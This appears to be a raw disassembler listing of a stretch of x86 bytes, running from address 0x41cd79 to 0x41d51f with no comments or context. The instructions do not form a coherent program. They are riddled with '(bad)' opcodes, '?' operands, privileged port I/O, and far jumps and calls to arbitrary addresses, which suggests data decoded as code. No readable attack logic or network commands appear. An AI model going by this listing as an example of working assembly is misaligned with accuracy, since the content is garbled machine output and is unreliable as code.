  41cd79:	fsubr  QWORD PTR [ebx+0x767a9c28]
  41cd7f:	pop    ss
  41cd80:	xchg   ebp,esp
  41cd82:	out    dx,eax
  41cd83:	xchg   ebp,eax
  41cd84:	xchg   ecx,eax
  41cd85:	lock fisubr WORD PTR [edx+edi*4-0x56]
  41cd8a:	xor    eax,0x56f60fc2
  41cd8f:	pushf  
  41cd90:	push   es
  41cd91:	sub    DWORD PTR [ebx-0x255a47b5],0x5c
  41cd98:	add    al,0x77
  41cd9a:	jge    0x41ce0a
  41cd9c:	mov    al,0x6c
  41cd9e:	retf   
  41cd9f:	int3   
  41cda0:	loopne 0x41cd4a
  41cda2:	pop    esi
  41cda3:	in     al,dx
  41cda4:	sbb    al,0x15
  41cda6:	in     al,0x2f
  41cda8:	iret   
  41cda9:	shl    DWORD PTR [edx-0xd7fd332],0x31
  41cdb0:	daa    
  41cdb1:	xor    al,0x51
  41cdb3:	mov    edi,0xa274a545
  41cdb8:	(bad)  
  41cdb9:	in     al,dx
  41cdba:	mov    ds:0xf2091357,al
  41cdbf:	sbb    al,0xfd
  41cdc1:	pop    eax
  41cdc2:	test   eax,0x55447258
  41cdc7:	dec    edi
  41cdc8:	jne    0x41ce26
  41cdca:	sub    esi,DWORD PTR [ebp+edi*4-0x67fa1fa8]
  41cdd1:	and    eax,esi
  41cdd3:	aaa    
  41cdd4:	mov    cl,0x48
  41cdd6:	cmp    al,0x65
  41cdd8:	adc    bh,BYTE PTR [ecx]
  41cdda:	mov    ds:0xffbe3b9,al
  41cddf:	loop   0x41cd66
  41cde1:	imul   esp,DWORD PTR ds:0x670b503a,0x70af15
  41cdeb:	xor    DWORD PTR [esi+0xa34922d],esp
  41cdf1:	push   ds
  41cdf2:	mov    WORD PTR [esi-0x25],?
  41cdf5:	popf   
  41cdf6:	inc    ebx
  41cdf7:	out    dx,eax
  41cdf8:	jle    0x41ce59
  41cdfa:	ret    0xa091
  41cdfd:	sub    eax,0xd517b96f
  41ce02:	bound  ecx,QWORD PTR [eax-0x6455de02]
  41ce08:	mov    al,0xd1
  41ce0a:	push   ebx
  41ce0b:	cmc    
  41ce0c:	xor    al,BYTE PTR [edx-0x1522623a]
  41ce12:	xor    ebp,esp
  41ce14:	sub    eax,0x75ffd1bd
  41ce19:	adc    al,bl
  41ce1b:	mov    dl,0x17
  41ce1d:	mov    DWORD PTR [esi+ecx*2+0x7c8a876d],esp
  41ce24:	icebp  
  41ce25:	mov    cl,0x76
  41ce27:	mov    esp,?
  41ce29:	fs sbb eax,0x6967f4c9
  41ce2f:	lods   eax,DWORD PTR ds:[esi]
  41ce30:	nop
  41ce31:	jno    0x41ce92
  41ce33:	call   0x8dc70604
  41ce38:	(bad)  
  41ce39:	popf   
  41ce3a:	jecxz  0x41ce2e
  41ce3c:	adc    al,0x32
  41ce3e:	mov    ebx,0xaac3d758
  41ce43:	(bad)  
  41ce44:	sbb    BYTE PTR [ebx],ah
  41ce46:	push   ecx
  41ce47:	dec    ecx
  41ce48:	inc    edx
  41ce49:	jb     0x41ceb5
  41ce4b:	push   ebp
  41ce4c:	test   eax,0x396d2826
  41ce51:	mov    al,ds:0x7d1490bc
  41ce56:	adc    DWORD PTR [edi+0x1abbfe53],eax
  41ce5c:	push   cs
  41ce5d:	inc    ebx
  41ce5e:	adc    esi,ebx
  41ce60:	(bad)  
  41ce61:	iret   
  41ce62:	mov    al,0x10
  41ce64:	pop    esp
  41ce65:	sahf   
  41ce66:	jg     0x41ced7
  41ce68:	mov    bh,0x8d
  41ce6a:	call   0x5a2:0x29271796
  41ce71:	or     eax,0x8f28827e
  41ce76:	mov    ebx,0x2ccac54
  41ce7b:	in     eax,dx
  41ce7c:	lods   eax,DWORD PTR ds:[esi]
  41ce7d:	jecxz  0x41ce3a
  41ce7f:	mov    bh,0x52
  41ce81:	std    
  41ce82:	lahf   
  41ce83:	imul   edx,DWORD PTR [edi-0x7d18394b],0xa3b14b5d
  41ce8d:	imul   BYTE PTR [ecx-0x71d5fdb1]
  41ce93:	setb   BYTE PTR [esi-0x2d]
  41ce97:	sub    edx,0xd59e786d
  41ce9d:	cli    
  41ce9e:	jmp    0x41cef8
  41cea0:	jge    0x41ce6b
  41cea2:	mov    ah,0xba
  41cea4:	pushf  
  41cea5:	ficom  WORD PTR [ebp-0x14]
  41cea8:	fwait
  41cea9:	cwde   
  41ceaa:	xor    al,0xe1
  41ceac:	inc    ebx
  41cead:	xadd   BYTE PTR [ecx-0x1203198],al
  41ceb4:	fisub  DWORD PTR [ebx+0x3]
  41ceb7:	xlat   BYTE PTR ds:[ebx]
  41ceb8:	je     0x41ced1
  41ceba:	retf   0x5f92
  41cebd:	mov    esp,0x4bf8c3fa
  41cec2:	mov    ch,0x9c
  41cec4:	mov    ecx,0x38bc3697
  41cec9:	jecxz  0x41ced4
  41cecb:	dec    eax
  41cecc:	test   al,0xe1
  41cece:	xchg   ebx,eax
  41cecf:	mov    dh,0x9b
  41ced1:	push   edi
  41ced2:	push   edx
  41ced3:	in     al,0xdc
  41ced5:	mov    ebp,DWORD PTR [ebp+0x4d]
  41ced8:	test   al,0xd8
  41ceda:	outs   dx,DWORD PTR ds:[esi]
  41cedb:	pop    ebp
  41cedc:	es pop edx
  41cede:	inc    ebp
  41cedf:	sti    
  41cee0:	(bad)  
  41cee1:	mov    eax,ds:0xbdbebb89
  41cee6:	cld    
  41cee7:	sbb    DWORD PTR [ebp+0x7de2330e],edi
  41ceed:	ss xchg ebp,eax
  41ceef:	mov    ebx,0x7baa1958
  41cef4:	xchg   edi,eax
  41cef5:	fs pusha 
  41cef7:	sti    
  41cef8:	in     al,dx
  41cef9:	dec    eax
  41cefa:	inc    edx
  41cefb:	scas   eax,DWORD PTR es:[edi]
  41cefc:	inc    esp
  41cefd:	shr    DWORD PTR [eax-0x71],cl
  41cf00:	scas   eax,DWORD PTR es:[edi]
  41cf01:	push   esi
  41cf02:	idiv   DWORD PTR [edi]
  41cf04:	jge    0x41cec8
  41cf06:	jnp    0x41cf21
  41cf08:	call   0x19fb9cb
  41cf0d:	add    BYTE PTR [esp+0x4180ed7d],al
  41cf14:	and    DWORD PTR ds:0xb1cdafac,ecx
  41cf1a:	adc    ah,BYTE PTR [esi+0x6a]
  41cf1d:	add    al,0xa1
  41cf1f:	pop    edi
  41cf20:	add    BYTE PTR [esi+esi*8-0x7f],cl
  41cf24:	or     edi,DWORD PTR [ebp-0xe]
  41cf27:	mov    ds:0x73f035f4,al
  41cf2c:	retf   0xdaaa
  41cf2f:	mov    ebp,0xeccdfcbf
  41cf34:	std    
  41cf35:	jns    0x41cf37
  41cf37:	int3   
  41cf38:	pop    esp
  41cf39:	fst    QWORD PTR [edx+edi*1-0xa]
  41cf3d:	push   esi
  41cf3e:	(bad)  
  41cf3f:	sbb    BYTE PTR [eax+0x1a],al
  41cf42:	leave  
  41cf43:	jo     0x41cf33
  41cf45:	test   BYTE PTR [eax+0x24c80df],dl
  41cf4b:	fcmovu st,st(5)
  41cf4d:	fs jmp 0x41cf84
  41cf50:	inc    ecx
  41cf51:	dec    esp
  41cf52:	fidiv  WORD PTR es:[eax+0x7da6da1e]
  41cf59:	push   esp
  41cf5a:	mov    eax,ds:0x4e74cbe7
  41cf5f:	or     BYTE PTR [esi-0x62],dh
  41cf62:	inc    esi
  41cf63:	outs   dx,DWORD PTR ds:[esi]
  41cf64:	pop    ebp
  41cf65:	sahf   
  41cf66:	add    al,0xd6
  41cf68:	loopne 0x41cf72
  41cf6a:	dec    eax
  41cf6b:	scas   al,BYTE PTR es:[edi]
  41cf6c:	jo     0x41cf91
  41cf6e:	xchg   ecx,eax
  41cf6f:	lds    esp,FWORD PTR [edi-0x6b4735cc]
  41cf75:	push   ebx
  41cf76:	adc    al,0xa3
  41cf78:	imul   esi,DWORD PTR [eax-0x401dde48],0x3e42c59b
  41cf82:	sbb    BYTE PTR ds:0x660e737e,cl
  41cf88:	shl    BYTE PTR [esi],1
  41cf8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf8b:	adc    ebx,esp
  41cf8d:	adc    DWORD PTR [ebx+0x41b9440e],esp
  41cf93:	dec    esi
  41cf94:	push   ebp
  41cf95:	adc    eax,0xb425c258
  41cf9a:	push   0xffffff9c
  41cf9c:	dec    ebp
  41cf9d:	jge    0x41cfa9
  41cf9f:	pop    esi
  41cfa0:	leave  
  41cfa1:	mov    dl,0x78
  41cfa3:	push   0x20
  41cfa5:	inc    ecx
  41cfa6:	dec    ebp
  41cfa7:	jp     0x41d004
  41cfa9:	out    dx,al
  41cfaa:	mov    bl,0xbb
  41cfac:	lods   al,BYTE PTR ds:[esi]
  41cfad:	and    eax,DWORD PTR [esi]
  41cfaf:	fwait
  41cfb0:	stos   DWORD PTR es:[edi],eax
  41cfb1:	scas   eax,DWORD PTR es:[edi]
  41cfb2:	sbb    DWORD PTR [edi+0x4bb91430],0x86a1cf03
  41cfbc:	pop    edx
  41cfbd:	ins    DWORD PTR es:[edi],dx
  41cfbe:	or     DWORD PTR [edi+0x38],ebp
  41cfc1:	mov    cl,0x1c
  41cfc3:	xchg   ecx,eax
  41cfc4:	push   DWORD PTR [edi-0x4c11e741]
  41cfca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfcb:	mov    ch,0xd5
  41cfcd:	sbb    edx,DWORD PTR [eax-0x5660b451]
  41cfd3:	mov    ch,0x5e
  41cfd5:	pop    ebx
  41cfd6:	repnz mov edi,0xeb6caefb
  41cfdc:	or     DWORD PTR [edx-0x76aba62],ecx
  41cfe2:	das    
  41cfe3:	aam    0xc1
  41cfe5:	and    eax,0xe9d4b402
  41cfea:	or     eax,0x31f4f40f
  41cfef:	loopne 0x41d021
  41cff1:	daa    
  41cff2:	sub    bl,BYTE PTR [ebp-0x34]
  41cff5:	test   DWORD PTR [ebp-0x79],0x194f6a7c
  41cffc:	mov    esp,0xdd60c319
  41d001:	cmp    BYTE PTR [ebx+0x5376b37b],al
  41d007:	add    DWORD PTR [ecx],edx
  41d009:	cdq    
  41d00a:	rcr    BYTE PTR [ecx+ebx*2+0x4380a24c],0x40
  41d012:	sar    DWORD PTR [ecx],0x5
  41d015:	and    DWORD PTR [eax],edx
  41d017:	sub    dl,bl
  41d019:	fisubr WORD PTR [eax+0x6e]
  41d01c:	mov    esp,0x17a81ffc
  41d021:	outs   dx,BYTE PTR ds:[esi]
  41d022:	and    BYTE PTR [edi-0x40284072],dl
  41d028:	mov    eax,0x4a74242
  41d02d:	daa    
  41d02e:	shr    ah,0x6a
  41d031:	cmp    al,0x61
  41d033:	sbb    al,0x6c
  41d035:	pop    esp
  41d036:	popa   
  41d037:	pushf  
  41d038:	push   ebp
  41d039:	shr    edi,1
  41d03b:	jne    0x41d043
  41d03d:	clc    
  41d03e:	aad    0xa2
  41d040:	imul   BYTE PTR [eax-0x6b]
  41d043:	adc    eax,0x339d7c82
  41d048:	sub    DWORD PTR [ebx],0x78957a27
  41d04e:	sbb    eax,0x148cc546
  41d053:	shr    BYTE PTR [eax-0x7c],0xd8
  41d057:	test   al,0x84
  41d059:	mov    edx,0x379fce77
  41d05e:	jmp    0xf5904eec
  41d063:	mov    BYTE PTR [esi],bl
  41d065:	mov    dl,BYTE PTR [ebx-0x5b5b547a]
  41d06b:	push   esi
  41d06c:	cmc    
  41d06d:	mov    al,0x70
  41d06f:	sti    
  41d070:	in     eax,dx
  41d071:	shr    BYTE PTR [ebp+0x94dc686],0x11
  41d078:	cmp    DWORD PTR [ecx-0x4e],ecx
  41d07b:	add    al,0xee
  41d07d:	test   BYTE PTR [bx],ch
  41d080:	or     bl,BYTE PTR [esi+0x629ef45d]
  41d086:	inc    edx
  41d087:	cld    
  41d088:	mov    edi,0x1a7a53cc
  41d08d:	xor    BYTE PTR [eax+0x5bd4fef8],ch
  41d093:	jno    0x9e98221d
  41d099:	fcmove st,st(0)
  41d09b:	lods   eax,DWORD PTR ds:[esi]
  41d09c:	adc    edx,DWORD PTR [esi+0x78]
  41d09f:	call   0x9aed:0x7de82ede
  41d0a6:	inc    ecx
  41d0a7:	sbb    dh,BYTE PTR [esi+0xe8da769]
  41d0ad:	pushf  
  41d0ae:	sbb    edi,esp
  41d0b0:	sub    DWORD PTR [ecx-0x5d],eax
  41d0b3:	xor    ecx,DWORD PTR [ebp-0x1f214365]
  41d0b9:	dec    esp
  41d0ba:	test   eax,0x470b851e
  41d0bf:	sbb    eax,0x536e5b73
  41d0c4:	adc    al,0x7d
  41d0c6:	mov    ch,BYTE PTR [edx]
  41d0c8:	sbb    eax,0x81f3749a
  41d0cd:	popf   
  41d0ce:	shr    eax,cl
  41d0d0:	imul   esi,edx,0x6e673595
  41d0d6:	inc    esi
  41d0d7:	xor    bl,BYTE PTR [ebx+ebp*4]
  41d0da:	dec    esp
  41d0db:	leave  
  41d0dc:	bound  ebx,QWORD PTR [edx]
  41d0de:	or     edi,DWORD PTR [edx]
  41d0e0:	test   BYTE PTR [ecx+0x7f],0x4b
  41d0e4:	pushf  
  41d0e5:	in     al,0x17
  41d0e7:	jno    0x41d122
  41d0e9:	scas   al,BYTE PTR es:[edi]
  41d0ea:	imul   edx,DWORD PTR [esi],0x8f66d96e
  41d0f0:	or     al,BYTE PTR [ebx-0x56094cb5]
  41d0f6:	jns    0x41d0c6
  41d0f8:	ins    BYTE PTR es:[edi],dx
  41d0f9:	mov    eax,ds:0x2cede6df
  41d0fe:	and    al,0xc9
  41d100:	push   ss
  41d101:	cli    
  41d102:	out    0x5b,eax
  41d104:	cmc    
  41d105:	rcl    DWORD PTR [ebp-0x5c],0x4e
  41d109:	rcl    BYTE PTR [edi+0x1d69546c],1
  41d10f:	jnp    0x41d12f
  41d111:	das    
  41d112:	mov    ecx,0x6d1a4367
  41d117:	mov    ds:0xe4feb337,al
  41d11c:	pop    ebp
  41d11d:	and    DWORD PTR [edx],edi
  41d11f:	retf   
  41d120:	cmp    eax,0x90a4ae92
  41d125:	pusha  
  41d126:	sub    eax,0x943ea640
  41d12b:	add    BYTE PTR [eax-0x10f1fd36],0x55
  41d132:	test   al,0x62
  41d134:	cmp    al,BYTE PTR [ecx+0x77]
  41d137:	leave  
  41d138:	fst    DWORD PTR [esi-0x48d7eb57]
  41d13e:	sub    ah,BYTE PTR [edx+eax*2-0x3d]
  41d142:	sar    edx,0xaa
  41d145:	jl     0x41d0f9
  41d147:	mov    ecx,DWORD PTR [ecx+0x4f]
  41d14a:	xchg   esp,eax
  41d14b:	inc    eax
  41d14c:	or     al,0x6b
  41d14e:	in     eax,dx
  41d14f:	add    eax,DWORD PTR [ecx+eax*2-0x25ff348c]
  41d156:	aaa    
  41d157:	pop    eax
  41d158:	mov    ah,dl
  41d15a:	stc    
  41d15b:	pushf  
  41d15c:	sti    
  41d15d:	pop    eax
  41d15e:	ret    
  41d15f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d160:	scas   al,BYTE PTR es:[edi]
  41d161:	retf   0xdd6a
  41d164:	data16 mov si,0x74c3
  41d169:	dec    esi
  41d16a:	mov    esp,0xcf1c4284
  41d16f:	sbb    BYTE PTR [ebx],bl
  41d171:	ret    
  41d172:	inc    ebp
  41d173:	dec    esp
  41d174:	xchg   BYTE PTR [edi-0x35],cl
  41d177:	icebp  
  41d178:	int    0xdd
  41d17a:	mov    eax,0x66d84378
  41d17f:	adc    al,0x76
  41d181:	lea    eax,[ecx-0x7ec8e07b]
  41d187:	sti    
  41d188:	sub    BYTE PTR [ecx],0xbc
  41d18b:	xchg   ecx,eax
  41d18c:	out    0x10,eax
  41d18e:	dec    edx
  41d18f:	push   esp
  41d190:	loopne 0x41d1ae
  41d192:	or     eax,0x2c64b593
  41d197:	into   
  41d198:	jo     0x41d1be
  41d19a:	repnz pop ss
  41d19c:	push   cs
  41d19d:	mov    eax,ds:0x54bd29c4
  41d1a2:	popa   
  41d1a3:	mov    al,ds:0x4f5e3921
  41d1a8:	imul   ebp,DWORD PTR [eax],0x7a
  41d1ab:	es out dx,eax
  41d1ad:	pushf  
  41d1ae:	add    bl,al
  41d1b0:	jne    0x41d17e
  41d1b2:	and    al,0x1c
  41d1b4:	adc    bh,ah
  41d1b6:	inc    ebx
  41d1b7:	into   
  41d1b8:	add    DWORD PTR [edi],edx
  41d1ba:	pop    ss
  41d1bb:	sti    
  41d1bc:	pop    eax
  41d1bd:	push   ebp
  41d1be:	call   0x6c86e428
  41d1c3:	test   DWORD PTR [edx-0x692d3442],esi
  41d1c9:	addr16 test dl,cl
  41d1cc:	out    0x60,eax
  41d1ce:	int3   
  41d1cf:	xor    bh,BYTE PTR [edi]
  41d1d1:	sub    eax,0x92859793
  41d1d6:	aaa    
  41d1d7:	shl    edx,cl
  41d1d9:	lods   eax,DWORD PTR ds:[esi]
  41d1da:	xor    eax,0x9df89aaa
  41d1df:	adc    ecx,DWORD PTR [esi]
  41d1e1:	mov    ebx,0xed444568
  41d1e6:	jmp    0x5205:0xabb2240d
  41d1ed:	ins    DWORD PTR es:[edi],dx
  41d1ee:	fs (bad) 
  41d1f0:	cld    
  41d1f1:	jns    0x41d262
  41d1f3:	in     al,0x2
  41d1f5:	push   edi
  41d1f6:	or     dl,BYTE PTR [ebx+0x25]
  41d1f9:	pop    ds
  41d1fa:	cs jg  0x41d201
  41d1fd:	bound  eax,QWORD PTR [edi]
  41d1ff:	dec    edx
  41d200:	inc    edx
  41d201:	or     dh,BYTE PTR [edi+0x4689b522]
  41d207:	retf   0x7a8d
  41d20a:	retf   
  41d20b:	cwde   
  41d20c:	mov    dh,0x9c
  41d20e:	fwait
  41d20f:	imul   edx,esi,0x55acb19a
  41d215:	jne    0x41d1fa
  41d217:	push   esi
  41d218:	fadd   DWORD PTR [edx+edi*8+0x58e5dac3]
  41d21f:	mov    dh,0x4f
  41d221:	adc    BYTE PTR [esi-0x65],0x8b
  41d225:	push   esi
  41d226:	mov    eax,0x3d9e1dc7
  41d22b:	xor    BYTE PTR [edi-0x2b4e1a13],ch
  41d231:	xchg   ebx,eax
  41d232:	jmp    0xfafd:0x82ae5957
  41d239:	and    DWORD PTR [eax-0x4c1775a],ecx
  41d23f:	ret    
  41d240:	pop    esi
  41d241:	mov    bh,0x49
  41d243:	fist   WORD PTR [eax-0x4dc83f6]
  41d249:	dec    edi
  41d24a:	scas   eax,DWORD PTR es:[edi]
  41d24b:	push   ss
  41d24c:	fwait
  41d24d:	enter  0xc95e,0x7c
  41d251:	adc    ebx,edx
  41d253:	xchg   DWORD PTR [ebx],edi
  41d255:	mov    ah,al
  41d257:	cmp    BYTE PTR [ebp+0x47358a82],cl
  41d25d:	or     esp,ebx
  41d25f:	sbb    dl,BYTE PTR [edi]
  41d261:	inc    ecx
  41d262:	pushf  
  41d263:	mov    WORD PTR [ebx+0xe],fs
  41d266:	das    
  41d267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d268:	sbb    eax,DWORD PTR [ecx-0x3d5d2fe8]
  41d26e:	push   esp
  41d26f:	divps  xmm6,XMMWORD PTR [esi]
  41d272:	pop    ss
  41d273:	inc    esi
  41d274:	xlat   BYTE PTR ds:[ebx]
  41d275:	add    ebx,eax
  41d277:	sub    DWORD PTR [edi+eax*8],0x97845deb
  41d27e:	adc    ch,cl
  41d280:	push   ebp
  41d281:	imul   edi,DWORD PTR fs:[edx+0x1b],0x20df4dea
  41d289:	(bad)  
  41d28a:	xchg   edi,eax
  41d28b:	ret    
  41d28c:	mov    dh,0xe3
  41d28e:	dec    edi
  41d28f:	stc    
  41d290:	sub    cl,BYTE PTR [eax+0x7f8036e7]
  41d296:	jecxz  0x41d2b6
  41d298:	push   0x65
  41d29a:	mov    ebp,0x1f5935ec
  41d29f:	push   ebx
  41d2a0:	dec    ebp
  41d2a1:	cmp    BYTE PTR [ecx],0xcf
  41d2a4:	or     al,0xfb
  41d2a6:	mov    ecx,0xa975edf2
  41d2ab:	jno    0x41d2a3
  41d2ad:	hlt    
  41d2ae:	dec    esi
  41d2af:	outs   dx,DWORD PTR ds:[esi]
  41d2b0:	les    esi,FWORD PTR [edx-0x17300333]
  41d2b6:	test   DWORD PTR [ecx-0x6bbb7221],edx
  41d2bc:	push   es
  41d2bd:	mov    esi,0x6a09124f
  41d2c2:	cmp    bl,BYTE PTR [edi+0x44]
  41d2c5:	cmp    ah,BYTE PTR [edx+0x69]
  41d2c8:	call   0xd088739
  41d2cd:	sub    BYTE PTR [eax-0x15],ch
  41d2d0:	xchg   esp,eax
  41d2d1:	fdivr  st,st(5)
  41d2d3:	pop    esi
  41d2d4:	cmp    al,bl
  41d2d6:	outs   dx,DWORD PTR ds:[esi]
  41d2d7:	rcr    DWORD PTR [esp+ebx*1+0xe],cl
  41d2db:	add    eax,0xe5fa61cd
  41d2e0:	ret    
  41d2e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2e2:	adc    edi,DWORD PTR [ebp-0x74]
  41d2e5:	cmp    al,0x46
  41d2e7:	jo     0x41d315
  41d2e9:	sub    edi,ebp
  41d2eb:	(bad)
  41d2f0:	repz js 0x41d328
  41d2f3:	mov    ebp,0x16d31f3f
  41d2f8:	repnz mov al,ds:0xbf6de700
  41d2fe:	in     al,0x3e
  41d300:	mov    bh,0x6d
  41d302:	ret    
  41d303:	shr    DWORD PTR fs:[edx+0x1c],0x97
  41d308:	push   ss
  41d309:	std    
  41d30a:	cmp    DWORD PTR [ecx*4+0x7ae3efea],ecx
  41d311:	ror    BYTE PTR [ecx+0x3ebe472f],0xcd
  41d318:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d319:	aad    0xeb
  41d31b:	clc    
  41d31c:	push   cx
  41d31e:	push   ecx
  41d31f:	ss jp  0x41d2c4
  41d322:	xor    BYTE PTR [ebx-0x72],dh
  41d325:	pop    es
  41d326:	inc    esi
  41d327:	mov    edx,0xd3f30774
  41d32c:	and    bl,ah
  41d32e:	mov    eax,0xf1e23972
  41d333:	cmp    BYTE PTR [esi+0x1369628a],bh
  41d339:	fsubr  DWORD PTR [esi-0x1d5261f7]
  41d33f:	outs   dx,BYTE PTR ss:[esi]
  41d341:	jns    0x41d2fa
  41d343:	and    al,0x9b
  41d345:	fbld   TBYTE PTR [edx+0x59]
  41d348:	repnz dec ebx
  41d34a:	jmp    0x41d2e8
  41d34c:	popf   
  41d34d:	and    al,0x3d
  41d34f:	and    BYTE PTR [ebx],ch
  41d351:	sbb    DWORD PTR ds:[edx-0x69],eax
  41d355:	jmp    0x96a64234
  41d35a:	iret   
  41d35b:	pop    ss
  41d35c:	xor    ebp,DWORD PTR [ebp+0x45]
  41d35f:	jmp    0x815190c0
  41d364:	jne    0x41d395
  41d366:	mov    ?,WORD PTR [edi-0x71c3c8dd]
  41d36c:	push   ecx
  41d36d:	arpl   WORD PTR [ebp-0x7a],sp
  41d370:	mov    dl,cl
  41d372:	mov    al,0x12
  41d374:	fiadd  WORD PTR [ecx+0x5a]
  41d377:	out    dx,al
  41d378:	loopne 0x41d3ab
  41d37a:	fdiv   DWORD PTR [esi]
  41d37c:	inc    edx
  41d37d:	push   ecx
  41d37e:	fsub   DWORD PTR [ebx+0x70]
  41d381:	pop    ss
  41d382:	inc    ecx
  41d383:	mov    ds:0x5c7612aa,eax
  41d388:	sbb    esi,ebp
  41d38a:	popf   
  41d38b:	push   es
  41d38c:	mov    ebp,0xa442fd3c
  41d391:	mov    ds:0xddcf37d3,al
  41d396:	push   ss
  41d397:	mov    DWORD PTR [eiz*2-0x545aafbe],ebp
  41d39e:	xchg   edi,eax
  41d39f:	jmp    0xe5982967
  41d3a4:	push   0xffffff82
  41d3a6:	or     edi,DWORD PTR [esi-0xbe62590]
  41d3ac:	pop    esp
  41d3ad:	xor    DWORD PTR [eax+0x4c],esp
  41d3b0:	adc    al,0xea
  41d3b2:	fcom   QWORD PTR [esi-0x6ca8ad68]
  41d3b8:	jne    0x41d393
  41d3ba:	ins    DWORD PTR es:[edi],dx
  41d3bb:	and    al,0xa
  41d3bd:	out    dx,al
  41d3be:	or     DWORD PTR [ecx-0x6f],edx
  41d3c1:	jb     0x41d3af
  41d3c3:	sub    eax,0xbe875e73
  41d3c8:	ror    bh,cl
  41d3ca:	fdivr  st,st(0)
  41d3cc:	mov    esi,eax
  41d3ce:	and    edi,DWORD PTR [ebp-0x3a]
  41d3d1:	retf   0xb0a2
  41d3d4:	arpl   WORD PTR [edx],ax
  41d3d6:	or     eax,0xfddfb38d
  41d3db:	das    
  41d3dc:	test   DWORD PTR [esp+edi*4-0x7ba90747],0x1e8a8320
  41d3e7:	xor    BYTE PTR [ecx+0x9],al
  41d3ea:	rcr    cl,0x35
  41d3ed:	retf   0x248c
  41d3f0:	(bad)  [edi-0x51]
  41d3f3:	jmp    0x41d42f
  41d3f5:	xchg   DWORD PTR ss:[edx-0x3412485b],edi
  41d3fc:	mov    cl,BYTE PTR [esi+0x5537daf9]
  41d402:	daa    
  41d403:	sahf   
  41d404:	pop    edx
  41d405:	repnz leave 
  41d407:	xchg   ebp,eax
  41d408:	pusha  
  41d409:	mov    WORD PTR ds:0x68e6d459,ss
  41d40f:	jne    0x41d413
  41d411:	cdq    
  41d412:	inc    ebp
  41d413:	sub    al,0xdf
  41d415:	sub    BYTE PTR [ecx],ch
  41d417:	add    al,0x37
  41d419:	mov    al,0x27
  41d41b:	js     0x41d47f
  41d41d:	mov    cl,0xb6
  41d41f:	cwde   
  41d420:	mov    edx,0x7b34804d
  41d425:	imul   esp,esi,0xffffffc2
  41d428:	dec    esp
  41d429:	in     al,0xe7
  41d42b:	push   es
  41d42c:	call   0x5b9f:0x38ec3fc6
  41d433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d434:	sbb    ebx,edi
  41d436:	jge    0x41d436
  41d438:	sub    DWORD PTR [edx+0x4d],ecx
  41d43b:	imul   esi,DWORD PTR [ebx],0xffffff93
  41d43e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d43f:	daa    
  41d440:	xchg   esi,eax
  41d441:	sar    DWORD PTR [ecx-0x33],0x3
  41d445:	je     0x41d43e
  41d447:	lods   al,BYTE PTR ds:[esi]
  41d448:	mov    eax,ds:0x7d00717
  41d44d:	xchg   edx,eax
  41d44e:	jno    0x41d3e6
  41d450:	popf   
  41d451:	dec    ecx
  41d452:	push   eax
  41d453:	jecxz  0x41d4a8
  41d455:	mov    cl,0x57
  41d457:	gs jb  0x41d43e
  41d45a:	fwait
  41d45b:	xlat   BYTE PTR ds:[ebx]
  41d45c:	fnstenv [ebx-0x7aa66d5a]
  41d462:	xchg   BYTE PTR [edx-0x70],al
  41d465:	mov    esp,0x2b958a87
  41d46a:	and    eax,0x3c22d8a2
  41d46f:	out    dx,al
  41d470:	mov    al,0x9e
  41d472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d473:	adc    eax,0x21c03d8a
  41d478:	and    eax,0xafc8483f
  41d47d:	sbb    esi,DWORD PTR [eax-0x7c3b804b]
  41d483:	inc    esi
  41d484:	pop    ds
  41d485:	push   edi
  41d486:	and    BYTE PTR [edx-0x77],0x3b
  41d48a:	mov    edi,0x9b2ded6c
  41d48f:	fistp  WORD PTR [ebp+0x2c]
  41d492:	inc    esi
  41d493:	imul   ebx,DWORD PTR [ecx],0xb77d35a2
  41d499:	mov    ch,0x32
  41d49b:	xor    eax,0xa110d74d
  41d4a0:	ficom  WORD PTR [ecx]
  41d4a2:	push   ds
  41d4a3:	inc    esp
  41d4a4:	daa    
  41d4a5:	pop    esi
  41d4a6:	sub    BYTE PTR [ebx-0x16],bh
  41d4a9:	loop   0x41d526
  41d4ab:	pop    ebx
  41d4ac:	cmp    DWORD PTR [ebp-0x27d36351],ebp
  41d4b2:	out    0x29,eax
  41d4b4:	add    edx,esp
  41d4b6:	outs   dx,BYTE PTR ds:[esi]
  41d4b7:	test   BYTE PTR [esi-0x7e],dl
  41d4ba:	push   edi
  41d4bb:	rcr    BYTE PTR ss:[ebx+ecx*2-0x5d],cl
  41d4c0:	ret    0xda7b
  41d4c3:	(bad)  
  41d4c4:	adc    DWORD PTR ds:0xeb8a8bb6,ecx
  41d4ca:	xor    ebp,DWORD PTR [eax]
  41d4cc:	loop   0x41d4bc
  41d4ce:	ins    BYTE PTR es:[edi],dx
  41d4cf:	jl     0x41d487
  41d4d1:	adc    eax,0x215e6035
  41d4d6:	jmp    0x9fb8d190
  41d4db:	not    DWORD PTR [edi+0x3e]
  41d4de:	pop    ebp
  41d4df:	push   esp
  41d4e0:	cmp    DWORD PTR [ebx],eax
  41d4e2:	mov    bh,0xb0
  41d4e4:	jno    0x41d4ed
  41d4e6:	pusha  
  41d4e7:	pop    eax
  41d4e8:	scas   al,BYTE PTR es:[edi]
  41d4e9:	sbb    BYTE PTR [ecx+0x760ad91b],0x8d
  41d4f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4f1:	das    
  41d4f2:	retf   
  41d4f3:	jae    0x41d4b7
  41d4f5:	push   esi
  41d4f6:	inc    esi
  41d4f7:	adc    ebx,DWORD PTR [eax+0x74]
  41d4fa:	push   ebp
  41d4fb:	retf   
  41d4fc:	fst    DWORD PTR [bp+si+0x53]
  41d500:	inc    edi
  41d501:	das    
  41d502:	xor    DWORD PTR [eax],ebp
  41d504:	ret    0xa1d
  41d507:	(bad)  
  41d508:	cs (bad) 
  41d50a:	cmp    al,BYTE PTR [ebx-0x25]
  41d50d:	aas    
  41d50e:	out    dx,al
  41d50f:	or     edi,DWORD PTR [ebx+esi*1-0x7c]
  41d513:	mov    esi,0x944c1842
  41d518:	sub    eax,0x890c307d
  41d51d:	and    DWORD PTR [ebx],ebp
  41d51f:	cmp    ch,ch
